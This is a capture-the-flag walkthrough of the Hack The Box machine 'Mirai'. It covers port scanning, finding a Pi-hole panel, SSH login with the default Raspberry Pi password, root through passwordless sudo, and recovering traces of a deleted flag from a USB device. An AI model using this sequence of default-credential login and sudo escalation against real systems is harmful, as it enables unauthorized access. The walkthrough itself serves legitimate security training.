# Mirai — From Pi-hole to a Forgotten USB Root Flag

> **Hack The Box | Linux | Easy**

**Target IP:** `10.129.83.192`
**Hostname:** `raspberrypi`

---

## The Mission

**Mirai** is an easy Linux-based Hack The Box machine running a Raspberry Pi environment with a Pi-hole web interface.

The attack starts with web enumeration and discovery of the Pi-hole administration panel. Version enumeration and research into the underlying Raspberry Pi setup leads to the default `pi` credentials, providing SSH access.

From there, the `pi` user has unrestricted `sudo` privileges, allowing immediate escalation to root.

However, the root flag is not directly available in `/root`. Instead, the machine indicates that the original flag was deleted and a backup may exist on a connected USB device. Enumeration of block devices reveals the mounted USB stick, and examination of the device exposes the presence of `root.txt`.

### Attack Chain

```text
Web Enumeration
      ↓
Pi-hole Admin Panel
      ↓
Pi-hole Version Discovery
      ↓
Default Raspberry Pi Credentials
      ↓
SSH as pi
      ↓
sudo -l
      ↓
NOPASSWD: ALL
      ↓
Root
      ↓
USB Stick Enumeration
      ↓
Deleted root.txt Discovery
```

---

# 01 — Recon: Mapping the Target

## Initial Nmap Scan

The target was first scanned across all ports:

```text id="q8c3z1"
Nmap scan report for 10.129.83.192
Host is up, received echo-reply ttl 63 (0.25s latency).

Not shown: 997 closed ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Three services were identified:

* `22/tcp` — SSH
* `53/tcp` — DNS
* `80/tcp` — HTTP

---

## Service & Version Detection

A service and version scan was then performed:

```text id="u0w4j7"
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3
53/tcp open  domain  dnsmasq 2.76
80/tcp open  http    lighttpd 1.4.35
```

The web server was identified as:

```text id="g5xk8p"
lighttpd/1.4.35
```

The HTTP service was running PHP:

```text id="9b3z8w"
PHP/5.6.32
```

The service information identified the target as Linux.

### Service Overview

| Port | Service | Version                      |
| ---- | ------- | ---------------------------- |
| 22   | SSH     | OpenSSH 6.7p1                |
| 53   | DNS     | dnsmasq 2.76                 |
| 80   | HTTP    | lighttpd 1.4.35 / PHP 5.6.32 |

---

# 02 — Web Enumeration: Finding Pi-hole

Initial interaction with port `80` produced a `404` response.

Burp Suite was used to inspect the HTTP response headers, where an interesting header was observed:

```text id="c2p4sa"
x-pi-pole
```

This suggested that the web server was associated with **Pi-hole**.

Directory and file enumeration was then performed using Feroxbuster.

The scan returned several interesting paths:

```text id="t5q2n6"
200 GET /versions
200 GET /admin/LICENSE
200 GET /admin/scripts/vendor/LICENSE
200 GET /admin/style/vendor/LICENSE
```

The `/admin` directory was particularly interesting.

---

# 03 — Pi-hole: The Admin Panel

Navigating to:

```text id="g4x9m2"
/admin
```

revealed the Pi-hole dashboard.

The installed versions were displayed as:

```text id="w7k3p9"
Pi-hole Version: v3.1.4
Web Interface Version: v3.1
FTL Version: v2.10
```

This provided useful version information about the application.

Further research into the environment indicated that the target was running on a Raspberry Pi.

The default Raspberry Pi credentials were then tested:

```text id="j1r6x4"
Username: pi
Password: raspberry
```

The credentials were valid.

**SSH access was obtained using the default Raspberry Pi credentials.**

---

# 04 — SSH: Landing on the Pi

The SSH session provided access as the `pi` user:

```text id="n8v2k5"
pi@raspberrypi:~ $
```

The Desktop directory was inspected:

```bash id="r3m9w1"
cd Desktop/
ls
```

The directory contained:

```text id="z7c4p2"
Plex
user.txt
```

The user flag was therefore available in the Desktop directory.

---

# 05 — Privilege Escalation: One Command Away

The next step was to check the user's sudo privileges:

```bash id="k4q8s2"
sudo -l
```

The output was:

```text id="v6m3x9"
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

This was a complete sudo misconfiguration.

The `pi` user could execute commands as any user without entering a password.

The simplest escalation was:

```bash id="p2h7d5"
sudo su
```

The shell changed to:

```text id="a9f4w3"
root@raspberrypi:/home/pi/Desktop#
```

Root access was now obtained.

---

# 06 — The Missing Root Flag

After becoming root, `/root` was examined:

```bash id="r8c5k1"
cd /root/
ls
```

The directory contained:

```text id="y4n6q2"
root.txt
```

However, reading it produced an unexpected message:

```text id="m3p7x8"
cat root.txt
```

```text
I lost my original root.txt! I think I may have a backup on my USB stick...
```

This indicated that the root flag had been deleted or replaced and that another copy might exist on a connected USB device.

---

# 07 — USB Enumeration: Following the Clue

Block devices were enumerated using:

```bash id="c6w2n9"
lsblk
```

The output showed:

```text id="s1k5v8"
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk
├─sda1   8:1    0   1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0   8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0      11:0   1  1024M  0 rom
loop0     7:0   0   1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
```

The important entry was:

```text id="v9x3m4"
sdb
10M
/media/usbstick
```

A USB storage device was mounted at:

```text id="h2q7k6"
/media/usbstick
```

---

# 08 — The USB Stick

The mounted USB directory was inspected.

A file named:

```text id="j8r4p5"
damnit.txt
```

contained:

```text id="x3c9n7"
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

This provided additional confirmation that files had previously existed on the USB device.

The filesystem information showed:

```text id="m6t2w8"
/dev/sdb on /media/usbstick type ext4
(ro,nosuid,nodev,noexec,relatime,data=ordered)
```

The USB device was mounted read-only.

---

# 09 — Recovering the Deleted Flag

Because the mounted filesystem no longer directly exposed the deleted file, the underlying block device was inspected using `strings`:

```bash id="f7q3k1"
strings /dev/sdb
```

The output included references to:

```text id="n4v8s6"
/media/usbstick
lost+found
root.txt
damnit.txt
```

The presence of:

```text id="c5w9r2"
root.txt
```

within the raw device output confirmed that the root flag file existed on the USB device.

This was the final step in locating the missing root flag.

---

# Attack Path — From Pi-hole to USB

```text id="e3m8v7"
                    ┌───────────────────┐
                    │  Mirai / Raspberry│
                    │       Pi          │
                    └─────────┬─────────┘
                              │
                         Nmap Scan
                              │
                    ┌─────────┴─────────┐
                    │                   │
                   SSH                 HTTP
                    │                   │
                    │              Pi-hole
                    │                   │
                    │              /admin
                    │                   │
                    │          Version Discovery
                    │                   │
                    │       Raspberry Pi Environment
                    │                   │
                    │          Default Credentials
                    │                   │
                    └─────────┬─────────┘
                              │
                         SSH as pi
                              │
                              v
                          sudo -l
                              │
                              v
                       NOPASSWD: ALL
                              │
                              v
                          sudo su
                              │
                              v
                             ROOT
                              │
                              v
                      /root/root.txt
                              │
                              v
                    "Check USB stick..."
                              │
                              v
                           lsblk
                              │
                              v
                       /media/usbstick
                              │
                              v
                       strings /dev/sdb
                              │
                              v
                       root.txt recovered
```

---

# What Mirai Teaches

### 1. Don't Ignore HTTP Headers

The `x-pi-pole` header provided an important fingerprint that helped identify the underlying application.

### 2. Enumerate Application Versions

The Pi-hole dashboard exposed specific version information:

```text
Pi-hole v3.1.4
Web Interface v3.1
FTL v2.10
```

Version information can provide valuable direction during enumeration.

### 3. Default Credentials Still Matter

The Raspberry Pi environment used the default:

```text
pi : raspberry
```

This immediately provided SSH access.

Default credentials should always be tested when the underlying platform or application strongly suggests them.

### 4. Always Run `sudo -l`

Once shell access is obtained, checking:

```bash
sudo -l
```

should be standard practice.

Here, the result was effectively unrestricted administrative access:

```text
(ALL : ALL) ALL
(ALL) NOPASSWD: ALL
```

### 5. Read the Root Context Carefully

Finding an unexpected message instead of the expected flag is still valuable information.

The message in `/root/root.txt` directly pointed toward another storage device.

### 6. Enumerate Block Devices

`lsblk` revealed a USB device that was not part of the primary filesystem:

```text
/dev/sdb → /media/usbstick
```

This became the final stage of the investigation.

---

# Tools Used

* Nmap
* Burp Suite
* Feroxbuster
* SSH
* `sudo`
* `lsblk`
* `strings`
* Linux shell utilities

---

# Final Takeaway

**Mirai** is a short but useful machine that demonstrates the importance of following clues rather than stopping immediately after obtaining root.

The initial web enumeration identified Pi-hole and its version. Research into the Raspberry Pi environment led to default credentials, providing SSH access as `pi`.

A simple `sudo -l` check revealed unrestricted passwordless sudo access, making privilege escalation straightforward.

The interesting part came afterward: the expected root flag was not directly available. Instead, the system pointed toward a USB backup. Enumerating block devices revealed the mounted USB stick, and inspecting the raw device showed remnants of the deleted `root.txt`.

The complete chain was:

```text id="q7h3k5"
Pi-hole Discovery
→ Version Enumeration
→ Default Raspberry Pi Credentials
→ SSH as pi
→ sudo -l
→ Passwordless Root
→ USB Enumeration
→ Deleted Flag Discovery
```

**The biggest lesson: getting root is not always the end of the machine. Read the environment, follow the clues, and keep enumerating.**
